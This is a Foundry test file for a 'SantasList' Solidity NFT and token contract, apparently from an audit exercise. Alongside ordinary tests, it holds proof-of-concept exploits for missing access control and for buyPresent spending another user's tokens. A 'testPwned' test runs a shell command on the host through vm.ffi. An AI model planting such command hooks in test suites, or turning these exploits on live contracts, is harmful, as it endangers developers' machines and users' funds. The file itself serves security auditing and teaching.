// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {SantasList} from "../../src/SantasList.sol";
import {SantaToken} from "../../src/SantaToken.sol";
import {Test, console} from "forge-std/Test.sol";



contract SantasListTest is Test{
    SantasList santasList;
    SantaToken santaToken;

    address user = makeAddr("user");
    address santa = makeAddr("santa");

    function setUp() public {
        vm.startPrank(santa);
        santasList = new SantasList();
        santaToken = SantaToken(santasList.getSantaToken());
        vm.stopPrank();
    }

    function testCheckList() public {
        vm.prank(santa);
        santasList.checkList(user, SantasList.Status.NICE);
        assertEq(uint256(santasList.getNaughtyOrNiceOnce(user)), uint256(SantasList.Status.NICE));
    }

    function testCheckListTwice() public {
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.NICE);
        santasList.checkTwice(user, SantasList.Status.NICE);
        vm.stopPrank();

        assertEq(uint256(santasList.getNaughtyOrNiceOnce(user)), uint256(SantasList.Status.NICE));
        assertEq(uint256(santasList.getNaughtyOrNiceTwice(user)), uint256(SantasList.Status.NICE));
    }

    function testCantCheckListTwiceWithDifferentThanOnce() public {
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.NICE);
        vm.expectRevert();
        santasList.checkTwice(user, SantasList.Status.NAUGHTY);
        vm.stopPrank();
    }

    function testCantCollectPresentBeforeChristmas() public {
        vm.expectRevert(SantasList.SantasList__NotChristmasYet.selector);
        santasList.collectPresent();
    }

    function testCantCollectPresentIfAlreadyCollected() public {
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.NICE);
        santasList.checkTwice(user, SantasList.Status.NICE);
        vm.stopPrank();

        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

        vm.startPrank(user);
        santasList.collectPresent();
        vm.expectRevert(SantasList.SantasList__AlreadyCollected.selector);
        santasList.collectPresent();
    }

    function testCollectPresentNice() public {
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.NICE);
        santasList.checkTwice(user, SantasList.Status.NICE);
        vm.stopPrank();

        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

        vm.startPrank(user);
        santasList.collectPresent();
        assertEq(santasList.balanceOf(user), 1);
        vm.stopPrank();
    }

    function testCollectPresentExtraNice() public {
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
        santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
        vm.stopPrank();

        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

        vm.startPrank(user);
        santasList.collectPresent();
        assertEq(santasList.balanceOf(user), 1);
        assertEq(santaToken.balanceOf(user), 1e18);
        vm.stopPrank();
    }

    function testCantCollectPresentUnlessAtLeastNice() public {
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.NAUGHTY);
        santasList.checkTwice(user, SantasList.Status.NAUGHTY);
        vm.stopPrank();

        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

        vm.startPrank(user);
        vm.expectRevert();
        santasList.collectPresent();
    }

    function testBuyPresent() public {
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
        santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
        vm.stopPrank();

        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

        vm.startPrank(user);
        santaToken.approve(address(santasList), 1e18);
        santasList.collectPresent();
        santasList.buyPresent(user);
        assertEq(santasList.balanceOf(user), 2);
        assertEq(santaToken.balanceOf(user), 0);
        vm.stopPrank();
    }

    function testOnlyListCanMintTokens() public {
        vm.expectRevert();
        santaToken.mint(user);
    }

    function testOnlyListCanBurnTokens() public {
        vm.expectRevert();
        santaToken.burn(user);
    }

    function testTokenURI() public {
        string memory tokenURI = santasList.tokenURI(0);
        assertEq(tokenURI, santasList.TOKEN_URI());
    }

    function testGetSantaToken() public {
        assertEq(santasList.getSantaToken(), address(santaToken));
    }

    function testGetSanta() public {
        assertEq(santasList.getSanta(), santa);
    }

    function testPwned() public {
        string[] memory cmds = new string[](2);
        cmds[0] = "touch";
        cmds[1] = string.concat("youve-been-pwned");
        vm.ffi(cmds);
    }
    


    
    function testProofOfCodeAccessControl() public {
        vm.prank(user);//user should not be able to set status, only the santa should be able to.
        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
        assertEq(uint256(santasList.getNaughtyOrNiceOnce(user)), uint256(SantasList.Status.EXTRA_NICE));
    }


    function testProofOfCodeBuyPresentBusinessLogic() public {
        address user2 = makeAddr("user2");
        vm.startPrank(santa);
        santasList.checkList(user2, SantasList.Status.EXTRA_NICE);
        santasList.checkTwice(user2, SantasList.Status.EXTRA_NICE);
        vm.stopPrank();
        vm.startPrank(user2);
        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);
        santasList.collectPresent(); // user2 gets a EXTRA_NICE present whats mean that he will get 1e18 stantasTokens to his address.
        vm.stopPrank();
        uint256 user2TokenBalanceBefore = santaToken.balanceOf(user2);
        uint256 userNftBalanceBefore = santasList.balanceOf(user);
        vm.prank(user);
        santasList.buyPresent(user2);
        uint256 user2TokenBalanceAfter = santaToken.balanceOf(user2);
        uint256 userNftBalanceAfter = santasList.balanceOf(user);
        console.log("Receiver token balance before: ", user2TokenBalanceBefore);
        console.log(" Receiver token balance after: ", user2TokenBalanceAfter);
        console.log(" Giver NFT balance before: ", userNftBalanceBefore);
        console.log(" Giver NFT balance after: ", userNftBalanceAfter);
    }

    function testProofOfCodeAddress0() public {
        vm.prank(user);
        santasList.buyPresent(address(0));
    }
}
